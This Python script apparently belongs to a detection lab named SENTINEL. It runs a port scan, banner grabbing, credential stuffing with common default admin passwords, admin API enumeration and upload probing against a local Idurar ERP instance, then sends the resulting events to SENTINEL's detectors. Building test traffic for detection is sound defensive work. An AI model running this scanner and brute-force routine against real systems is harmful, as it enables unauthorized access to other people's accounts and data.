"""Multi-phase attack against Idurar ERP — generates real network traffic
and pushes telemetry to SENTINEL for live detection.

Phases:
  1. Reconnaissance — port scan, service fingerprinting
  2. Brute force — credential stuffing against /api/auth/login
  3. API enumeration — probe admin endpoints, list resources
  4. Data staging — probe upload/file endpoints

Each phase generates UnifiedEvents pushed to SENTINEL's /v1/events.
Events are spaced across stride periods so the windowing engine emits
windows and the 9 attack-type detectors fire.
"""

from __future__ import annotations

import argparse
import json
import socket
import sys
import time
import urllib.request
from datetime import UTC, datetime, timedelta
from pathlib import Path
from urllib.error import HTTPError, URLError

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))
from sentinel.schemas import UnifiedEvent  # noqa: E402

# Spacing between events so each lands in a separate stride window
EVENT_SPACING_SECONDS = 31

# Common Idurar admin credentials to try
CREDENTIALS = [
    ("admin@admin.com", "admin123"),
    ("admin@admin.com", "password"),
    ("admin@admin.com", "admin"),
    ("admin@admin.com", "123456"),
    ("test@test.com", "test123"),
    ("root@root.com", "root"),
    ("admin@admin.com", "letmein"),
    ("admin@admin.com", "qwerty"),
    ("admin@admin.com", "trustno1"),
    ("admin@admin.com", "admin2024"),
]

# Endpoints to enumerate
ENUM_ENDPOINTS = [
    "/api/health",
    "/api/users",
    "/api/customers",
    "/api/invoices",
    "/api/payments",
    "/api/products",
    "/api/quotes",
    "/api/settings",
    "/api/setting/list",
    "/api/employees",
    "/api/expenses",
    "/api/bankaccounts",
    "/api/transactions",
    "/api/inventory",
    "/api/organizations",
    "/api/currencies",
    "/api/taxes",
    "/api/paymentmode",
]


def _make_event(
    scenario: str,
    index: int,
    source: str,
    dest: str,
    event_type: str,
    features: dict[str, float],
    stage: str,
    timestamp: datetime,
) -> UnifiedEvent:
    return UnifiedEvent(
        event_id=f"attack:{scenario}:{index}",
        timestamp=timestamp,
        source_entity=source,
        destination_entity=dest,
        event_type=event_type,
        features=features,
        source_format="replay",
        provenance=f"attack-scenario:{scenario}:{stage}",
    )


def phase_recon(target_host: str, target_port: int, base_time: datetime) -> list[UnifiedEvent]:
    """Phase 1: Port scan + service fingerprinting."""
    events = []
    print("[1/4] Reconnaissance — port scan")

    # Simulate scanning common ports
    ports_to_scan = [22, 80, 443, 3000, 3306, 5000, 5432, 8000, 8080, 8888, 9090, 27017]
    open_ports = []
    for i, port in enumerate(ports_to_scan):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_host, port))
            sock.close()
            is_open = result == 0
            if is_open:
                open_ports.append(port)
        except OSError:
            is_open = False

        features = {
            "dst_port": float(port),
            "is_open": 1.0 if is_open else 0.0,
            "probe_bytes": 44.0,  # SYN probe size
            "bytes_sent": 44.0,
            "bytes_received": 0.0 if not is_open else 60.0,
            "flows_per_second": 0.1,
            "syn_ratio": 1.0,
            "rst_ratio": 0.0 if is_open else 1.0,
        }
        events.append(
            _make_event(
                "recon",
                i,
                target_host,
                f"target:{target_port}",
                "flow",
                features,
                "Reconnaissance",
                base_time + timedelta(seconds=i * EVENT_SPACING_SECONDS),
            )
        )

    # Service fingerprint on open ports
    for j, port in enumerate(open_ports[:5]):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((target_host, port))
            # Try to grab banner
            try:
                sock.sendall(b"GET / HTTP/1.0\r\nHost: test\r\n\r\n")
                banner = sock.recv(1024)
                service_len = len(banner)
            except OSError:
                service_len = 0
            sock.close()
        except OSError:
            service_len = 0

        features = {
            "dst_port": float(port),
            "probe_bytes": float(service_len + 44),
            "bytes_sent": 44.0,
            "bytes_received": float(service_len),
            "banner_grab": 1.0,
            "flows_per_second": 0.05,
        }
        events.append(
            _make_event(
                "recon",
                len(ports_to_scan) + j,
                target_host,
                f"target:{port}",
                "flow",
                features,
                "Reconnaissance",
                base_time + timedelta(seconds=(len(ports_to_scan) + j) * EVENT_SPACING_SECONDS),
            )
        )

    print(f"  → scanned {len(ports_to_scan)} ports, found {len(open_ports)} open")
    return events


def phase_brute_force(target: str, base_time: datetime) -> list[UnifiedEvent]:
    """Phase 2: Credential stuffing against login endpoint."""
    events = []
    print("[2/4] Brute force — credential stuffing")

    for i, (email, password) in enumerate(CREDENTIALS):
        data = json.dumps({"email": email, "password": password}).encode()
        request = urllib.request.Request(
            f"{target}/api/auth/login",
            data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=5) as resp:
                body = resp.read()
                status_code = resp.status
                login_success = 1.0
        except HTTPError as exc:
            body = exc.read()
            status_code = exc.code
            login_success = 0.0
        except (URLError, OSError):
            status_code = 0
            login_success = 0.0

        features = {
            "failed_auth_per_min": 1.0 if status_code in (401, 403) else 0.0,
            "auth_attempts": 1.0,
            "login_success": login_success,
            "http_status": float(status_code),
            "bytes_sent": float(len(data)),
            "bytes_received": float(len(body)),
            "flows_per_second": 0.2,
        }
        events.append(
            _make_event(
                "brute_force",
                i,
                "attacker",
                "target:8888",
                "authentication",
                features,
                "Initial Access",
                base_time + timedelta(seconds=i * EVENT_SPACING_SECONDS),
            )
        )

    successes = sum(1 for e in events if e.features.get("login_success", 0) == 1.0)
    print(f"  → {len(CREDENTIALS)} attempts, {successes} succeeded")
    return events


def phase_enum(target: str, base_time: datetime) -> list[UnifiedEvent]:
    """Phase 3: API endpoint enumeration."""
    events = []
    print("[3/4] API enumeration — endpoint probing")

    for i, endpoint in enumerate(ENUM_ENDPOINTS):
        request = urllib.request.Request(
            f"{target}{endpoint}",
            headers={"Content-Type": "application/json"},
            method="GET",
        )
        try:
            with urllib.request.urlopen(request, timeout=5) as resp:
                body = resp.read()
                status_code = resp.status
        except HTTPError as exc:
            body = exc.read()
            status_code = exc.code
        except (URLError, OSError):
            status_code = 0
            body = b""

        features = {
            "http_status": float(status_code),
            "bytes_sent": 0.0,
            "bytes_received": float(len(body)),
            "endpoint_depth": float(endpoint.count("/")),
            "new_internal_edge": 1.0,
            "flows_per_second": 0.15,
        }
        events.append(
            _make_event(
                "enum",
                i,
                "attacker",
                "target:8888",
                "flow",
                features,
                "Initial Access",
                base_time + timedelta(seconds=i * EVENT_SPACING_SECONDS),
            )
        )

    found = sum(1 for e in events if e.features.get("http_status", 0) not in (0, 401, 403, 404))
    print(f"  → probed {len(ENUM_ENDPOINTS)} endpoints, {found} returned data")
    return events


def phase_staging(target: str, base_time: datetime) -> list[UnifiedEvent]:
    """Phase 4: Data staging — probe upload and file endpoints."""
    events = []
    print("[4/4] Data staging — upload probing")

    upload_endpoints = [
        "/api/uploads",
        "/api/documents",
        "/api/attachments",
        "/api/files",
        "/api/backup",
        "/api/import",
    ]

    for i, endpoint in enumerate(upload_endpoints):
        # Try POST with multipart-like content
        boundary = "----SentinelLabAttack"
        body_parts = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="probe.txt"\r\n'
            f"Content-Type: text/plain\r\n\r\n"
            f"SENTINEL_LAB_PROBE\r\n"
            f"--{boundary}--\r\n"
        ).encode()

        request = urllib.request.Request(
            f"{target}{endpoint}",
            data=body_parts,
            headers={
                "Content-Type": f"multipart/form-data; boundary={boundary}",
            },
            method="POST",
        )
        try:
            with urllib.request.urlopen(request, timeout=5) as resp:
                body = resp.read()
                status_code = resp.status
        except HTTPError as exc:
            body = exc.read()
            status_code = exc.code
        except (URLError, OSError):
            status_code = 0
            body = b""

        features = {
            "http_status": float(status_code),
            "bytes_sent": float(len(body_parts)),
            "bytes_received": float(len(body)),
            "upload_attempt": 1.0,
            "new_internal_edge": 1.0,
            "flows_per_second": 0.1,
            "data_staged": 1.0 if status_code in (200, 201) else 0.0,
        }
        events.append(
            _make_event(
                "staging",
                i,
                "attacker",
                "target:8888",
                "flow",
                features,
                "Lateral Movement",
                base_time + timedelta(seconds=i * EVENT_SPACING_SECONDS),
            )
        )

    uploaded = sum(1 for e in events if e.features.get("data_staged", 0) == 1.0)
    print(f"  → probed {len(upload_endpoints)} upload endpoints, {uploaded} accepted data")
    return events


def push_events(api: str, api_key: str, events: list[UnifiedEvent]) -> dict:
    """Push events to SENTINEL /v1/events and return the response."""
    request = urllib.request.Request(
        f"{api.rstrip('/')}/v1/events",
        data=json.dumps({"events": [e.model_dump(mode="json") for e in events]}).encode(),
        headers={"Content-Type": "application/json", "X-API-Key": api_key},
        method="POST",
    )
    with urllib.request.urlopen(request, timeout=30) as resp:
        return json.loads(resp.read())


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--target", default="http://localhost:8888", help="Idurar target URL")
    parser.add_argument("--api", default="http://localhost:8100", help="SENTINEL API URL")
    parser.add_argument("--api-key", default="sent_demo_key_2026", help="SENTINEL API key")
    parser.add_argument("--target-host", default="localhost", help="Target host for port scan")
    parser.add_argument("--target-port", type=int, default=8888, help="Target port")
    parser.add_argument("--dry-run", action="store_true", help="Skip actual attacks")
    args = parser.parse_args(argv)

    print("=" * 60)
    print("SENTINEL LAB — Multi-Phase Attack Against Idurar ERP")
    print("=" * 60)
    print(f"Target: {args.target}")
    print(f"API:    {args.api}")
    print()

    base_time = datetime.now(UTC)
    all_events: list[UnifiedEvent] = []

    # Phase 1: Reconnaissance
    if not args.dry_run:
        recon_events = phase_recon(args.target_host, args.target_port, base_time)
        all_events.extend(recon_events)
        time.sleep(1)

    # Phase 2: Brute force
    brute_base = base_time + timedelta(seconds=len(all_events) * EVENT_SPACING_SECONDS)
    if not args.dry_run:
        brute_events = phase_brute_force(args.target, brute_base)
        all_events.extend(brute_events)
        time.sleep(1)

    # Phase 3: API enumeration
    enum_base = base_time + timedelta(seconds=len(all_events) * EVENT_SPACING_SECONDS)
    if not args.dry_run:
        enum_events = phase_enum(args.target, enum_base)
        all_events.extend(enum_events)
        time.sleep(1)

    # Phase 4: Data staging
    stage_base = base_time + timedelta(seconds=len(all_events) * EVENT_SPACING_SECONDS)
    if not args.dry_run:
        stage_events = phase_staging(args.target, stage_base)
        all_events.extend(stage_events)

    print(f"\nTotal events generated: {len(all_events)}")

    # Push to SENTINEL
    if not args.dry_run and all_events:
        print(f"\nPushing {len(all_events)} events to SENTINEL...")
        result = push_events(args.api, args.api_key, all_events)
        print(f"  events_seen:        {result['events_seen']}")
        print(f"  windows_emitted:    {result['windows_emitted']}")
        print(f"  alert_status:       {result['alert_status']}")
        print(f"  peak_probability:   {result.get('peak_probability')}")
        if result.get("incidents"):
            print(f"  incidents:          {len(result['incidents'])}")
            for inc in result["incidents"]:
                risk_level = inc.get("risk", {}).get("level", "N/A")
                print(f"    - {inc.get('title', 'N/A')} (risk: {risk_level})")
    elif args.dry_run:
        print("\n[DRY RUN] Skipping event push")

    print("\nDone.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
